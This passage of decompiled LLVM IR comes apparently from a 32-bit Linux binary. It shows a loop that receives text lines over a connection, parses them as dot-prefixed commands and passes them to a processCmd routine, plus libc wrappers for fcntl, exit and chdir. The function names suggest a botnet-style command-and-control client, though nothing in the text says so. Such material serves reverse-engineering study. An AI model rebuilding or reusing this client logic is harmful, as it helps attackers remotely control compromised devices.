  %v3_80495de = call i32 @__libc_waitpid(i32 %v2_80495c9, i32 0, i32 1)
  %tmp96 = icmp slt i32 %v3_80495de, 1
  %.pre = add i32 %storemerge22, 1
  br i1 %tmp96, label %dec_label_pc_804975d, label %dec_label_pc_80495eb

dec_label_pc_80495eb:                             ; preds = %dec_label_pc_80495b9
  br label %dec_label_pc_804961e

dec_label_pc_80495f4:                             ; preds = %dec_label_pc_804961e, %dec_label_pc_8049657
  %v2_80495f7 = mul i32 %storemerge24, 4
  %v0_80495fc = load i32, i32* @global_var_8054564.18, align 4
  %v2_8049601 = add i32 %v0_80495fc, %v2_80495f7
  %v1_8049604 = add i32 %v2_8049601, -4
  %v1_8049617 = inttoptr i32 %v2_8049601 to i32*
  %v2_8049617 = load i32, i32* %v1_8049617, align 4
  %v2_8049619 = inttoptr i32 %v1_8049604 to i32*
  store i32 %v2_8049617, i32* %v2_8049619, align 4
  %v4_804961b = add i32 %storemerge24, 1
  br label %dec_label_pc_804961e

dec_label_pc_804961e:                             ; preds = %dec_label_pc_80495eb, %dec_label_pc_80495f4
  %storemerge24 = phi i32 [ %v4_804961b, %dec_label_pc_80495f4 ], [ %.pre, %dec_label_pc_80495eb ]
  %v0_8049637 = load i32, i32* @global_var_8052304.17, align 4
  %v10_804964f = icmp eq i32 %v0_8049637, 0
  br i1 %v10_804964f, label %dec_label_pc_8049657, label %dec_label_pc_80495f4

dec_label_pc_8049657:                             ; preds = %dec_label_pc_804961e
  %v0_8049632 = load i32, i32* @global_var_8052300.16, align 256
  store i32 0, i32* @edi, align 4
  %v10_804966b = icmp ult i32 %storemerge24, %v0_8049632
  br i1 %v10_804966b, label %dec_label_pc_80495f4, label %dec_label_pc_8049673

dec_label_pc_8049673:                             ; preds = %dec_label_pc_8049657
  %v2_8049676 = mul i32 %storemerge24, 4
  %v0_804967b = load i32, i32* @global_var_8054564.18, align 4
  %v2_8049680 = add i32 %v2_8049676, -4
  %v1_8049683 = add i32 %v2_8049680, %v0_804967b
  %v1_8049686 = inttoptr i32 %v1_8049683 to i32*
  store i32 0, i32* %v1_8049686, align 4
  %v0_804968c = load i32, i32* @global_var_8052300.16, align 256
  %v0_8049691 = load i32, i32* @global_var_8052304.17, align 4
  %v1_8049697 = add i32 %v0_804968c, -1
  %v4_8049697 = icmp ne i32 %v0_804968c, 0
  %v2_804969a = zext i1 %v4_8049697 to i32
  %v3_804969a = add i32 %v0_8049691, -1
  %v4_804969a = add i32 %v3_804969a, %v2_804969a
  store i32 %v1_8049697, i32* @global_var_8052300.16, align 256
  store i32 %v4_804969a, i32* @global_var_8052304.17, align 4
  %v2_80496b7 = mul i32 %v1_8049697, 4
  %v1_80496ba = add i32 %v2_80496b7, 4
  store i32 %v1_80496ba, i32* %stack_var_-4400, align 4
  %v1_80496c0 = call i32 @malloc(i32 %v1_80496ba)
  br label %dec_label_pc_80496f3

dec_label_pc_80496d1:                             ; preds = %dec_label_pc_80496f3, %dec_label_pc_804972c
  %v2_80496d4 = mul i32 %storemerge23, 4
  %v5_80496d9 = add i32 %v2_80496d4, %v1_80496c0
  %v0_80496e4 = load i32, i32* @global_var_8054564.18, align 4
  %v2_80496e9 = add i32 %v0_80496e4, %v2_80496d4
  %v1_80496ec = inttoptr i32 %v2_80496e9 to i32*
  %v2_80496ec = load i32, i32* %v1_80496ec, align 4
  %v2_80496ee = inttoptr i32 %v5_80496d9 to i32*
  store i32 %v2_80496ec, i32* %v2_80496ee, align 4
  %v4_80496f0 = add i32 %storemerge23, 1
  br label %dec_label_pc_80496f3

dec_label_pc_80496f3:                             ; preds = %dec_label_pc_8049673, %dec_label_pc_80496d1
  %storemerge23 = phi i32 [ %v4_80496f0, %dec_label_pc_80496d1 ], [ 0, %dec_label_pc_8049673 ]
  %v0_804970c = load i32, i32* @global_var_8052304.17, align 4
  %v10_8049724 = icmp eq i32 %v0_804970c, 0
  br i1 %v10_8049724, label %dec_label_pc_804972c, label %dec_label_pc_80496d1

dec_label_pc_804972c:                             ; preds = %dec_label_pc_80496f3
  %v0_8049707 = load i32, i32* @global_var_8052300.16, align 256
  store i32 0, i32* @edi, align 4
  %v10_8049740 = icmp ult i32 %storemerge23, %v0_8049707
  br i1 %v10_8049740, label %dec_label_pc_80496d1, label %dec_label_pc_8049748

dec_label_pc_8049748:                             ; preds = %dec_label_pc_804972c
  %v0_8049748 = load i32, i32* @global_var_8054564.18, align 4
  store i32 %v0_8049748, i32* %stack_var_-4400, align 4
  %v1_8049750 = call i32 @free(i32 %v0_8049748)
  store i32 %v1_80496c0, i32* @global_var_8054564.18, align 4
  br label %dec_label_pc_804975d

dec_label_pc_804975d:                             ; preds = %dec_label_pc_80495b9, %dec_label_pc_8049748
  br label %dec_label_pc_8049760

dec_label_pc_8049760:                             ; preds = %dec_label_pc_8049a3c, %dec_label_pc_804975d
  %storemerge22 = phi i32 [ %.pre, %dec_label_pc_804975d ], [ 0, %dec_label_pc_8049a3c ]
  %v1_8049769 = ashr i32 %storemerge22, 31
  %v0_8049770 = load i32, i32* @global_var_8052300.16, align 256
  %v0_8049775 = load i32, i32* @global_var_8052304.17, align 4
  %v10_804978d = icmp ult i32 %v1_8049769, %v0_8049775
  br i1 %v10_804978d, label %dec_label_pc_80495b9, label %dec_label_pc_8049799

dec_label_pc_8049799:                             ; preds = %dec_label_pc_8049760
  store i32 %v0_8049775, i32* @edi, align 4
  %v6_80497a5 = icmp ugt i32 %v1_8049769, %v0_8049775
  br i1 %v6_80497a5, label %dec_label_pc_80497b9, label %dec_label_pc_80497a7

dec_label_pc_80497a7:                             ; preds = %dec_label_pc_8049799
  %v10_80497ad = icmp ult i32 %storemerge22, %v0_8049770
  br i1 %v10_80497ad, label %dec_label_pc_80495b9, label %dec_label_pc_80497b9

dec_label_pc_80497b9:                             ; preds = %dec_label_pc_80497a7, %dec_label_pc_8049799
  %v0_80497bc = load i32, i32* @ebp, align 4
  %v2_80497bc = add i32 %v4_8049a57, -4276
  %v3_80497bc = add i32 %v2_80497bc, %v0_80497bc
  %v4_80497bc = inttoptr i32 %v3_80497bc to i8*
  store i8 0, i8* %v4_80497bc, align 1
  store i32 %v2_8049a3c, i32* %stack_var_-4400, align 4
  %v2_80497cd = call i32 @trim(i8* %v3_8049a57)
  %v2_80497de = load i8, i8* %v3_8049a57, align 4
  %v10_80497e1 = icmp eq i8 %v2_80497de, 46
  %v1_80497e3 = icmp eq i1 %v10_80497e1, false
  br i1 %v1_80497e3, label %dec_label_pc_8049a3c, label %dec_label_pc_80497e9

dec_label_pc_80497e9:                             ; preds = %dec_label_pc_80497b9
  %v2_80497f899 = load i8, i8* %v5_8049821, align 1
  %v7_80497fb103 = icmp eq i8 %v2_80497f899, 32
  br i1 %v7_80497fb103, label %dec_label_pc_8049809, label %dec_label_pc_80497ff

dec_label_pc_80497f2:                             ; preds = %dec_label_pc_80497ff
  %v5_80497f2 = add i32 %storemerge21.in105, 1
  %storemerge21 = inttoptr i32 %v5_80497f2 to i8*
  %v2_80497f8 = load i8, i8* %storemerge21, align 1
  %v7_80497fb = icmp eq i8 %v2_80497f8, 32
  br i1 %v7_80497fb, label %dec_label_pc_8049809, label %dec_label_pc_80497ff

dec_label_pc_80497ff:                             ; preds = %dec_label_pc_80497e9, %dec_label_pc_80497f2
  %storemerge21106 = phi i8* [ %storemerge21, %dec_label_pc_80497f2 ], [ %v5_8049821, %dec_label_pc_80497e9 ]
  %storemerge21.in105 = phi i32 [ %v5_80497f2, %dec_label_pc_80497f2 ], [ %v1_80497ec, %dec_label_pc_80497e9 ]
  %v2_8049802 = load i8, i8* %storemerge21106, align 1
  %v4_8049805 = icmp eq i8 %v2_8049802, 0
  %v1_8049807 = icmp eq i1 %v4_8049805, false
  br i1 %v1_8049807, label %dec_label_pc_80497f2, label %dec_label_pc_8049809

dec_label_pc_8049809:                             ; preds = %dec_label_pc_80497f2, %dec_label_pc_80497ff, %dec_label_pc_80497e9
  %storemerge21.lcssa = phi i8* [ %v5_8049821, %dec_label_pc_80497e9 ], [ %storemerge21106, %dec_label_pc_80497ff ], [ %storemerge21, %dec_label_pc_80497f2 ]
  %v2_804980c = load i8, i8* %storemerge21.lcssa, align 1
  %v4_804980f = icmp eq i8 %v2_804980c, 0
  br i1 %v4_804980f, label %dec_label_pc_8049a3c, label %dec_label_pc_8049817

dec_label_pc_8049817:                             ; preds = %dec_label_pc_8049809
  store i8 0, i8* %storemerge21.lcssa, align 1
  %v3_804983b = call i32 @_strlen(i8* %v5_8049821)
  %v6_8049842 = add i32 %v2_8049a3c, %v3_804983b
  %v1_8049845 = add i32 %v6_8049842, 2
  %v5_8049848 = inttoptr i32 %v1_8049845 to i8*
  br label %dec_label_pc_8049872

dec_label_pc_804984d:                             ; preds = %dec_label_pc_804989b, %dec_label_pc_8049872
  %v3_8049864 = call i32 @_strlen(i8* %v5_8049848)
  %v6_804986b = add i32 %v1_8049845, %v3_8049864
  %v1_804986e = add i32 %v6_804986b, -1
  %v1_804986f = inttoptr i32 %v1_804986e to i8*
  store i8 0, i8* %v1_804986f, align 1
  br label %dec_label_pc_8049872

dec_label_pc_8049872:                             ; preds = %dec_label_pc_8049817, %dec_label_pc_804984d
  %v3_8049889 = call i32 @_strlen(i8* %v5_8049848)
  %v6_8049890 = add i32 %v1_8049845, %v3_8049889
  %v1_8049893 = add i32 %v6_8049890, -1
  %v1_8049894 = inttoptr i32 %v1_8049893 to i8*
  %v2_8049894 = load i8, i8* %v1_8049894, align 1
  %v10_8049897 = icmp eq i8 %v2_8049894, 10
  br i1 %v10_8049897, label %dec_label_pc_804984d, label %dec_label_pc_804989b

dec_label_pc_804989b:                             ; preds = %dec_label_pc_8049872
  store i32 %v1_8049845, i32* @edi, align 4
  %v3_80498b2 = call i32 @_strlen(i8* %v5_8049848)
  %v4_80498b2 = mul i32 %v3_80498b2, -1
  %v5_80498b2 = add i32 %v4_80498b2, -2
  store i32 %v5_80498b2, i32* @ecx, align 4
  %v6_80498b9 = sub i32 %v1_8049845, %v4_80498b2
  %v1_80498bc = add i32 %v6_80498b9, -1
  %v1_80498bd = inttoptr i32 %v1_80498bc to i8*
  %v2_80498bd = load i8, i8* %v1_80498bd, align 1
  %v10_80498c0 = icmp eq i8 %v2_80498bd, 13
  br i1 %v10_80498c0, label %dec_label_pc_804984d, label %dec_label_pc_80498c4

dec_label_pc_80498c4:                             ; preds = %dec_label_pc_804989b
  %v2_80498d2111 = load i8, i8* %v5_8049848, align 1
  %v7_80498d5115 = icmp eq i8 %v2_80498d2111, 32
  br i1 %v7_80498d5115, label %dec_label_pc_80498e3, label %dec_label_pc_80498d9

dec_label_pc_80498cc:                             ; preds = %dec_label_pc_80498d9
  %v5_80498cc = add i32 %v4_80498cf118, 1
  %v22_80498cc = inttoptr i32 %v5_80498cc to i8*
  %v2_80498d2 = load i8, i8* %v22_80498cc, align 1
  %v7_80498d5 = icmp eq i8 %v2_80498d2, 32
  br i1 %v7_80498d5, label %dec_label_pc_80498e3, label %dec_label_pc_80498d9

dec_label_pc_80498d9:                             ; preds = %dec_label_pc_80498c4, %dec_label_pc_80498cc
  %v4_80498cf118 = phi i32 [ %v5_80498cc, %dec_label_pc_80498cc ], [ %v1_8049845, %dec_label_pc_80498c4 ]
  %stack_var_-60.0117 = phi i8* [ %v22_80498cc, %dec_label_pc_80498cc ], [ %v5_8049848, %dec_label_pc_80498c4 ]
  %v2_80498dc = load i8, i8* %stack_var_-60.0117, align 1
  %v4_80498df = icmp eq i8 %v2_80498dc, 0
  %v1_80498e1 = icmp eq i1 %v4_80498df, false
  br i1 %v1_80498e1, label %dec_label_pc_80498cc, label %dec_label_pc_80498e3

dec_label_pc_80498e3:                             ; preds = %dec_label_pc_80498cc, %dec_label_pc_80498d9, %dec_label_pc_80498c4
  %stack_var_-60.0.lcssa = phi i8* [ %v5_8049848, %dec_label_pc_80498c4 ], [ %stack_var_-60.0117, %dec_label_pc_80498d9 ], [ %v22_80498cc, %dec_label_pc_80498cc ]
  %v4_80498cf.lcssa = phi i32 [ %v1_8049845, %dec_label_pc_80498c4 ], [ %v4_80498cf118, %dec_label_pc_80498d9 ], [ %v5_80498cc, %dec_label_pc_80498cc ]
  store i8 0, i8* %stack_var_-60.0.lcssa, align 1
  %v5_80498e9 = add i32 %v4_80498cf.lcssa, 1
  %v2_8049912124 = load i8, i8* %v5_8049848, align 1
  %v4_8049915126 = icmp eq i8 %v2_8049912124, 0
  %v1_8049917128 = icmp eq i1 %v4_8049915126, false
  br i1 %v1_8049917128, label %dec_label_pc_80498f4, label %dec_label_pc_8049919

dec_label_pc_80498f4:                             ; preds = %dec_label_pc_80498e3, %dec_label_pc_80498f4
  %storemerge20130 = phi i8* [ %storemerge20, %dec_label_pc_80498f4 ], [ %v5_8049848, %dec_label_pc_80498e3 ]
  %storemerge20.in129 = phi i32 [ %v5_804990c, %dec_label_pc_80498f4 ], [ %v1_8049845, %dec_label_pc_80498e3 ]
  %v2_80498f7 = load i8, i8* %storemerge20130, align 1
  %v3_80498f7 = zext i8 %v2_80498f7 to i32
  store i32 %v3_80498f7, i32* %stack_var_-4400, align 4
  %v1_8049900 = call i32 @__GI_toupper(i32 %v3_80498f7)
  %v1_8049905 = urem i32 %v1_8049900, 256
  %v2_8049905 = load i32, i32* @edx, align 4
  %v3_8049905 = and i32 %v2_8049905, -256
  %v4_8049905 = or i32 %v3_8049905, %v1_8049905
  store i32 %v4_8049905, i32* @edx, align 4
  %v1_804990a = trunc i32 %v1_8049900 to i8
  store i8 %v1_804990a, i8* %storemerge20130, align 1
  %v5_804990c = add i32 %storemerge20.in129, 1
  %storemerge20 = inttoptr i32 %v5_804990c to i8*
  %v2_8049912 = load i8, i8* %storemerge20, align 1
  %v4_8049915 = icmp eq i8 %v2_8049912, 0
  %v1_8049917 = icmp eq i1 %v4_8049915, false
  br i1 %v1_8049917, label %dec_label_pc_80498f4, label %dec_label_pc_8049919

dec_label_pc_8049919:                             ; preds = %dec_label_pc_80498f4, %dec_label_pc_80498e3
  store i32 %v5_80498e9, i32* @eax, align 4
  store i32 %v5_80498e9, i32* %stack_var_-4400, align 4
  %v2_804992e = call i32 @__GI_strtok(i32 %v5_80498e9, i32 ptrtoint (i32* @global_var_804ff5b.26 to i32))
  %v5_8049933 = inttoptr i32 %v2_804992e to i8*
  store i8* %v5_8049933, i8** %stack_var_-32, align 4
  store i32 %v1_8049845, i32* %stack_var_-188, align 4
  %v5_80499ea27 = icmp eq i32 %v2_804992e, 0
  %v1_80499ee34 = icmp eq i1 %v5_80499ea27, false
  br i1 %v1_80499ee34, label %dec_label_pc_8049944, label %dec_label_pc_80499f4

dec_label_pc_8049944:                             ; preds = %dec_label_pc_8049919, %dec_label_pc_80499d3
  %v3_8049955 = phi i8* [ %tmp97, %dec_label_pc_80499d3 ], [ %v5_8049933, %dec_label_pc_8049919 ]
  %stack_var_-36.135 = phi i32 [ %stack_var_-36.0, %dec_label_pc_80499d3 ], [ 1, %dec_label_pc_8049919 ]
  %v2_8049947 = load i8, i8* %v3_8049955, align 1
  %v3_8049947 = zext i8 %v2_8049947 to i32
  store i32 %v3_8049947, i32* @eax, align 4
  %v10_804994a = icmp eq i8 %v2_8049947, 10
  br i1 %v10_804994a, label %dec_label_pc_80499d3, label %dec_label_pc_8049952

dec_label_pc_8049952:                             ; preds = %dec_label_pc_8049944
  %v4_8049944 = ptrtoint i8* %v3_8049955 to i32
  store i32 %stack_var_-36.135, i32* @ebx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8049944, i32* @edi, align 4
  %v3_804996c = call i32 @_strlen(i8* %v3_8049955)
  %v1_8049970 = add i32 %v3_804996c, 1
  store i32 %v1_8049970, i32* %stack_var_-4400, align 4
  %v1_8049977 = call i32 @malloc(i32 %v1_8049970)
  %v1_804997c = load i32, i32* @ebp, align 4
  %v2_804997c = load i32, i32* @ebx, align 4
  %v3_804997c = mul i32 %v2_804997c, 4
  %v4_804997c = add i32 %v1_804997c, -180
  %v5_804997c = add i32 %v4_804997c, %v3_804997c
  %v6_804997c = inttoptr i32 %v5_804997c to i32*
  store i32 %v1_8049977, i32* %v6_804997c, align 4
  %v3_8049983 = load i8*, i8** %stack_var_-32, align 4
  %v4_8049983 = ptrtoint i8* %v3_8049983 to i32
  %v3_804999a = call i32 @_strlen(i8* %v3_8049983)
  %v1_804999e = add i32 %v3_804999a, 1
  %v0_80499a7 = load i32, i32* @ebp, align 4
  %v2_80499a7 = mul i32 %stack_var_-36.135, 4
  %v3_80499a7 = add i32 %v2_80499a7, -180
  %v4_80499a7 = add i32 %v0_80499a7, %v3_80499a7
  %v5_80499a7 = inttoptr i32 %v4_80499a7 to i32*
  %v6_80499a7 = load i32, i32* %v5_80499a7, align 4
  %v1_80499ae = inttoptr i32 %v6_80499a7 to i8*
  store i32 %v6_80499a7, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_80499b3 = and i32 %v6_80499a7, -256
  %v5_80499b5 = call i8* @_memset(i8* %v1_80499ae, i32 %v1_80499b3, i32 %v1_804999e)
  %v6_80499b5 = ptrtoint i8* %v5_80499b5 to i32
  store i32 %v6_80499b5, i32* @ecx, align 4
  %v0_80499bd = load i32, i32* @ebp, align 4
  %v4_80499bd = add i32 %v0_80499bd, %v3_80499a7
  %v5_80499bd = inttoptr i32 %v4_80499bd to i32*
  %v6_80499bd = load i32, i32* %v5_80499bd, align 4
  store i32 %v6_80499bd, i32* @eax, align 4
  store i32 %v6_80499bd, i32* %stack_var_-4400, align 4
  %v2_80499cb = inttoptr i32 %v6_80499bd to i8*
  %v3_80499cb = call i32 @strcpy(i8* %v2_80499cb, i32 %v4_8049983)
  store i32 %v3_80499cb, i32* @eax, align 4
  %v4_80499d0 = add i32 %stack_var_-36.135, 1
  br label %dec_label_pc_80499d3

dec_label_pc_80499d3:                             ; preds = %dec_label_pc_8049944, %dec_label_pc_8049952
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.135, %dec_label_pc_8049944 ], [ %v4_80499d0, %dec_label_pc_8049952 ]
  store i32 0, i32* %stack_var_-4400, align 4
  %v2_80499e2 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_804ff5b.26 to i32))
  store i32 %v2_80499e2, i32* %tmp95, align 4
  %v5_80499ea = icmp eq i32 %v2_80499e2, 0
  %v1_80499ee = icmp eq i1 %v5_80499ea, false
  %tmp97 = inttoptr i32 %v2_80499e2 to i8*
  br i1 %v1_80499ee, label %dec_label_pc_8049944, label %dec_label_pc_80499f4

dec_label_pc_80499f4:                             ; preds = %dec_label_pc_80499d3, %dec_label_pc_8049919
  %stack_var_-36.1.lcssa = phi i32 [ 1, %dec_label_pc_8049919 ], [ %stack_var_-36.0, %dec_label_pc_80499d3 ]
  store i32 %stack_var_-36.1.lcssa, i32* %stack_var_-4400, align 4
  %v3_8049a04 = call i32 @processCmd(i32 %stack_var_-36.1.lcssa, i32* nonnull %stack_var_-188)
  %v7_8049a0d = icmp sgt i32 %stack_var_-36.1.lcssa, 1
  br i1 %v7_8049a0d, label %dec_label_pc_8049a1f.lr.ph, label %dec_label_pc_8049a3c

dec_label_pc_8049a1f.lr.ph:                       ; preds = %dec_label_pc_80499f4
  br label %dec_label_pc_8049a1f

dec_label_pc_8049a1f:                             ; preds = %dec_label_pc_8049a1f.lr.ph, %dec_label_pc_8049a1f
  %storemerge136 = phi i32 [ 1, %dec_label_pc_8049a1f.lr.ph ], [ %v4_8049a31, %dec_label_pc_8049a1f ]
  %v0_8049a22 = load i32, i32* @ebp, align 4
  %v2_8049a22 = mul i32 %storemerge136, 4
  %v3_8049a22 = add i32 %v2_8049a22, -180
  %v4_8049a22 = add i32 %v3_8049a22, %v0_8049a22
  %v5_8049a22 = inttoptr i32 %v4_8049a22 to i32*
  %v6_8049a22 = load i32, i32* %v5_8049a22, align 4
  store i32 %v6_8049a22, i32* %stack_var_-4400, align 4
  %v1_8049a2c = call i32 @free(i32 %v6_8049a22)
  %v4_8049a31 = add nuw i32 %storemerge136, 1
  %exitcond = icmp eq i32 %v4_8049a31, %stack_var_-36.1.lcssa
  br i1 %exitcond, label %dec_label_pc_8049a3c, label %dec_label_pc_8049a1f

dec_label_pc_8049a3c:                             ; preds = %dec_label_pc_8049a1f, %dec_label_pc_80499f4, %dec_label_pc_8049809, %dec_label_pc_80497b9, %dec_label_pc_8049591
  %v0_8049a42 = load i32, i32* @global_var_8052308.15, align 8
  store i32 %v0_8049a42, i32* %stack_var_-4400, align 4
  %v4_8049a57 = call i32 @recvLine(i32 %v0_8049a42, i8* %v3_8049a57, i32 4096)
  %v13_8049a5f = icmp eq i32 %v4_8049a57, -1
  %v1_8049a63 = icmp eq i1 %v13_8049a5f, false
  br i1 %v1_8049a63, label %dec_label_pc_8049760, label %dec_label_pc_8049591

; uselistorder directives
  uselistorder i32 %storemerge136, { 1, 0 }
  uselistorder i32 %v1_8049970, { 1, 0 }
  uselistorder i32 %stack_var_-36.135, { 0, 3, 2, 1 }
  uselistorder i8* %v3_8049955, { 2, 1, 0 }
  uselistorder i8* %storemerge20, { 1, 0 }
  uselistorder i32 %v5_804990c, { 1, 0 }
  uselistorder i32 %v1_8049900, { 1, 0 }
  uselistorder i8* %storemerge20130, { 1, 0 }
  uselistorder i8* %v5_8049848, { 0, 3, 1, 2, 4, 5, 7, 6 }
  uselistorder i32 %v1_8049845, { 5, 2, 3, 4, 6, 7, 1, 0, 8 }
  uselistorder i8* %storemerge21.lcssa, { 1, 0 }
  uselistorder i32 %v0_8049775, { 1, 0, 2 }
  uselistorder i32 %storemerge22, { 2, 3, 0, 1 }
  uselistorder i32 %storemerge23, { 1, 0, 2 }
  uselistorder i32 %v2_80496d4, { 1, 0 }
  uselistorder i32 %v1_80496c0, { 1, 0 }
  uselistorder i32 %v0_804968c, { 1, 0 }
  uselistorder i32 %storemerge24, { 1, 2, 0, 3 }
  uselistorder i8* %v5_8049821, { 3, 0, 1, 2 }
  uselistorder i8* %v3_8049a57, { 2, 0, 1 }
  uselistorder i32 %v2_8049a3c, { 0, 2, 1 }
  uselistorder i32 %v1_8049518, { 1, 0, 2 }
  uselistorder i32 %v2_80494c0, { 1, 0 }
  uselistorder i32 %v2_8049443, { 1, 0 }
  uselistorder i32* %stack_var_-4400, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 17, 18, 0, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i8** %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder i32 ()* @rand_next, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_init, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049a1f, { 1, 0 }
  uselistorder label %dec_label_pc_80499d3, { 1, 0 }
  uselistorder label %dec_label_pc_8049944, { 1, 0 }
  uselistorder label %dec_label_pc_80498f4, { 1, 0 }
  uselistorder label %dec_label_pc_80498e3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80498d9, { 1, 0 }
  uselistorder label %dec_label_pc_8049872, { 1, 0 }
  uselistorder label %dec_label_pc_8049809, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80497ff, { 1, 0 }
  uselistorder label %dec_label_pc_804975d, { 1, 0 }
  uselistorder label %dec_label_pc_80496f3, { 1, 0 }
  uselistorder label %dec_label_pc_80496d1, { 1, 0 }
  uselistorder label %dec_label_pc_804961e, { 1, 0 }
  uselistorder label %dec_label_pc_80495f4, { 1, 0 }
  uselistorder label %dec_label_pc_8049591, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804956f, { 2, 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8049a70 = load i32, i32* @edi, align 4
  %v0_8049a71 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_8049a89 = add i32 %arg2, -12
  %v6_8049a8f = icmp ugt i32 %v1_8049a89, 2
  br i1 %v6_8049a8f, label %dec_label_pc_8049a9f, label %dec_label_pc_8049a91

dec_label_pc_8049a91:                             ; preds = %entry
  %v4_8049a95 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8049a89)
  br label %dec_label_pc_8049ac1

dec_label_pc_8049a9f:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8049aa7 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8049aa7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8049aa7, -4095
  br i1 %tmp, label %dec_label_pc_8049abf, label %dec_label_pc_8049ab3

dec_label_pc_8049ab3:                             ; preds = %dec_label_pc_8049a9f
  %v1_8049ab3 = call i32 @__errno_location(i32 %v0_8049a71)
  %v0_8049ab8 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049ab8 = sub i32 0, %v0_8049ab8
  %v2_8049aba = inttoptr i32 %v1_8049ab3 to i32*
  store i32 %v1_8049ab8, i32* %v2_8049aba, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049abf

dec_label_pc_8049abf:                             ; preds = %dec_label_pc_8049a9f, %dec_label_pc_8049ab3
  %v0_8049abf = phi i32 [ %v2_8049aa7, %dec_label_pc_8049a9f ], [ -1, %dec_label_pc_8049ab3 ]
  br label %dec_label_pc_8049ac1

dec_label_pc_8049ac1:                             ; preds = %dec_label_pc_8049a91, %dec_label_pc_8049abf
  %v0_8049ac6 = phi i32 [ %v4_8049a95, %dec_label_pc_8049a91 ], [ %v0_8049abf, %dec_label_pc_8049abf ]
  store i32 %v0_8049a71, i32* @ebx, align 4
  store i32 %v0_8049a70, i32* @edi, align 4
  ret i32 %v0_8049ac6

; uselistorder directives
  uselistorder i32 %v2_8049aa7, { 1, 0, 2 }
  uselistorder i32 %v0_8049a71, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049ac1, { 1, 0 }
  uselistorder label %dec_label_pc_8049abf, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049ac8 = load i32, i32* @edi, align 4
  store i32 %v0_8049ac8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8049ae0 = load i32, i32* @ebx, align 4
  %v1_8049ae8 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8049ae8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049ae8, -4095
  br i1 %tmp, label %dec_label_pc_8049b00, label %dec_label_pc_8049af4

dec_label_pc_8049af4:                             ; preds = %entry
  %v1_8049af4 = call i32 @__errno_location(i32 %v0_8049ae0)
  %v0_8049af9 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049af9 = sub i32 0, %v0_8049af9
  %v2_8049afb = inttoptr i32 %v1_8049af4 to i32*
  store i32 %v1_8049af9, i32* %v2_8049afb, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049b00

dec_label_pc_8049b00:                             ; preds = %entry, %dec_label_pc_8049af4
  %v0_8049b03 = phi i32 [ %v1_8049ae8, %entry ], [ -1, %dec_label_pc_8049af4 ]
  %v2_8049b05 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049b05, i32* %edi.global-to-local, align 4
  ret i32 %v0_8049b03

; uselistorder directives
  uselistorder i32 %v1_8049ae8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049b00, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b30 = load i32, i32* @edi, align 4
  store i32 %v0_8049b30, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8049b38 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8049b40 = call i32 @chdir(i32 %v0_8049b38)
  store i32 %v0_8049b38, i32* @ebx, align 4
  store i32 %v1_8049b40, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049b40, -4095
  br i1 %tmp, label %dec_label_pc_8049b58, label %dec_label_pc_8049b4c

dec_label_pc_8049b4c:                             ; preds = %entry
  %v1_8049b4c = call i32 @__errno_location(i32 %v0_8049b38)
  %v0_8049b51 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049b51 = sub i32 0, %v0_8049b51
  %v2_8049b53 = inttoptr i32 %v1_8049b4c to i32*
  store i32 %v1_8049b51, i32* %v2_8049b53, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049b58

